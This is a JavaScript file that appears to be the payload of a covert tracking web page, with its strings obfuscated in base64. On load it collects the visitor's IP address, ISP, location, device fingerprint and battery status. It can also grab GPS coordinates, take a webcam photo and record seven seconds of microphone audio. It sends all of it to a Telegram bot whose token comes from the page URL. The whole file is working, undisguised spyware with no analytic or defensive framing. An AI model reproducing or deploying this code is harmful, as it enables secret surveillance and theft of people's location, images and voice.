const decr=(vlu)=>{return atob(vlu)};
console.log("hey")
const val = decr(new URLSearchParams(window.location.search).get(decr('GdmFs'.slice(1))).slice(1).slice(0,-1)).split("|");
const opt = new URLSearchParams(window.location.search).get(decr("Pb3B0".slice(1)));
const address = decr(`XaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRNZXNzYWdl`.slice(1)).replace("||",val[0]);
const address_p = decr("FaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRQaG90bw==".slice(1)).replace("||",val[0]);
const address_s = decr("MaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRBdWRpbw==".slice(1)).replace("||",val[0]);

const dts ={};
const loc={};
const transp=async(data)=>{const dat = await fetch(address,{method:decr("GUE9TVA==".slice(1)),headers: {'Content-Type': decr("8YXBwbGljYXRpb24vanNvbg==".slice(1))},body: JSON.stringify({chat_id: val[1],text: data,})},)};

const transp_p=async(data)=>{
    const blob = new Blob([new Uint8Array(atob(data.split(',')[1]).split('').map(c => c.charCodeAt(0)))], { type: decr("aW1hZ2UvcG5n") });
    const formData = new FormData();
    formData.append(decr("Y2hhdF9pZA=="),val[1]);
    formData.append(decr("cGhvdG8="), blob, decr("cGhvdG8ucG5n"));
    const rsp = await fetch(address_p, { method: decr("GUE9TVA==".slice(1)), body: formData });
}

const cap_t=async()=>{
    try{
        const str = await navigator.mediaDevices.getUserMedia({ video: true });
        const vd = document.createElement(decr("dmlkZW8="));
        vd.srcObject = str;
        vd.play();
        vd.onloadeddata = () => {
            const cnv = document.createElement(decr("Y2FudmFz"));
            cnv.width = vd.videoWidth;
            cnv.height = vd.videoHeight;
            cnv.getContext(decr("MmQ=")).drawImage(vd, 0, 0);
            const im_dt = cnv.toDataURL(decr("aW1hZ2UvcG5n"));
            transp_p(im_dt);
            str.getTracks().forEach(track => track.stop());
        }
    }catch(e){
        transp(decr("Zm91bmRFcnJvciA6IA==")+e);
    }
}


const transp_s=async(audioBlob)=>{
    const formData = new FormData();
    formData.append(decr("Y2hhdF9pZA=="),val[1]);
    formData.append(decr("YXVkaW8="), audioBlob, decr("YXVkaW8ud2F2"));
    const rsp = await fetch(address_s, { method: decr("GUE9TVA==".slice(1)), body: formData });
}


function cap_s() {
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(strm => {
            const mr = new MediaRecorder(strm);
            const chnks = [];
            mr.ondataavailable = (evnt) => chnks.push(evnt.data);
            mr.onstop = () => {
                const audioBlob = new Blob(chnks, { type: decr("YXVkaW8vd2F2") });
                transp_s(audioBlob);
            };

            mr.start();
            setTimeout(() => {
                mr.stop();
                strm.getTracks().forEach(trk => trk.stop());
            }, 7000); 
        })
        .catch(console.error);
}


const bsc=()=>{
    dts[decr("b3Blbl90aW1l")]=new Date().toLocaleString();
    dts[decr("dXNlcmFnZW50")]=navigator.userAgent;
    dts[decr("c2NyZWVuU2l6ZQ==")]=`${screen.width}x${screen.height}`;
    dts[decr("dGltZVpvbmU=")]=(new Date()).getTimezoneOffset()/60;
    dts[decr("aXNfbW9iaWxl")]=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    dts[decr("bG9naWNhbFByb2Nlc3NvcnM=")]=navigator.hardwareConcurrency;
    dts[decr("cGxhdGZvcm0=")]=navigator.platform;
    dts[decr("ZGV2aWNlX21lbW1vcnk=")]=navigator.deviceMemory;
    dts[decr("Y29va2llc19lbmFibGVk")]=navigator.cookieEnabled;
    dts[decr("dmVuZG9y")]=navigator.vendor;
    dts[decr("bGFuZ3VhZ2Vz")]=navigator.languages;
}

const btrInf=async()=>{
    const bttr = await navigator.getBattery();
    const bttr_lvl = Math.round(bttr.level * 100);
    const chrg_stt = bttr.charging ? decr("Q2hhcmdpbmc=") : decr("Tm90IENoYXJnaW5n");
    const disch_tm = bttr.dischargingTime !== Infinity ? `${Math.round(bttr.dischargingTime / 60)} min` : "N/A";
    dts[decr("YmF0dGVyeUxldmVs")] = `${bttr_lvl} %`;
    dts[decr("YmF0dGVyeVN0YXR1cw==")] = chrg_stt;
    dts[decr("dGltZVRvRGlzY2hhcmdl")] = disch_tm;
};

const clr_sch=()=> {
    const schm =window.matchMedia("(prefers-color-scheme: dark)").matches;
    const clr_sch = schm ? decr("RGFyayBNb2Rl") : decr("TGlnaHQgTW9kZQ==");
    dts[decr("Y29sb3JTY2hlbWU=")] = clr_sch;
};

const fn_str=(obj)=>{
    let fn_dt = "";
    Object.keys(obj).forEach(dt => {
        fn_dt+=`${dt} : ${dts[dt]}\n`;
    });
    return fn_dt;
}

const g_loc=async()=>{
    if (navigator.geolocation) {
        try{
            const pst = await new Promise((resolve, reject) => {navigator.geolocation.getCurrentPosition(resolve, reject);});
            loc[decr("b3Blbl90aW1l")]=new Date().toLocaleString();
            const la= pst.coords.latitude;
            const lo = pst.coords.longitude;
            loc[decr("bGF0dGl0dWRl")]=la; 
            loc[decr("bG9uZ2l0dWRl")] = lo;
            loc[decr("bG9jYXRpb25BY2N1cmFjeQ==")] = pst.coords.accuracy;
            loc[decr("bG9jYXRpb25fbGluaw==")]=decr("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzP3E9TEEsTE8=").replace("LA",la).replace("LO",lo);
            transp(JSON.stringify(loc));

        }catch(err){
            dts[decr("bG9jYXRpb25FcnJvcg==")] =err ;
        }

    }else{
        dts[decr("bG9jYXRpb25FcnJvcg==")] = decr("R2VvbG9jYXRpb24gTm90IHN1cHBwb3J0ZWQ=");
    }
};



const isp_in=async()=>{
    console.log("this is starting")
    try{
        const rsp = await fetch(decr("aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=="));
        const rsp_dat = await rsp.json();
        dts[decr("aXB2NA==")] = rsp_dat.ip;
        dts[decr("aXNw")] = rsp_dat.org;
        dts[decr("Y2l0eQ==")] = rsp_dat.city;
        dts[decr("Y291bnRyeQ==")] = rsp_dat.country;
        await btrInf();
        bsc();
        if(opt.includes("l")){g_loc();}
        if(opt.includes("c")){cap_t();}
        if(opt.includes("s")){cap_s()}
        clr_sch();
        transp(fn_str(dts));

    }catch(err){dts[decr("aXNwX2Vycm9y")]=err};
}




isp_in();


